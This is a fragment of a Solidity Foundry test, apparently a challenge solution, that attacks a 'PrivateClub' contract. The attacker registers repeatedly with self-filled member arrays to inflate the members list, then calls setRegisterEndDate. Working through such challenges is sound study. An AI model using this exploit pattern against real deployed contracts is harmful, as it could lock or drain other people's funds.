...
contract PrivateClubHack is Test {
    ...
    function _registerMyself() private {
        uint256 currentMembersCount = club.membersCount();

        uint256 etherNeeded = 1 ether * currentMembersCount;
        address[] memory members = new address[](currentMembersCount);

        for (uint256 i = 0; i < members.length; i++) {
            members[i] = hacker;
        }

        club.becomeMember{value: etherNeeded}(members);
    }
    ...
    function test_attack() public {
        ...
        // register myself multiple times making the members array bigger and bigger
        _registerMyself();
        _registerMyself();
        _registerMyself();
        _registerMyself();
        ...
        club.setRegisterEndDate(block.timestamp - 1);
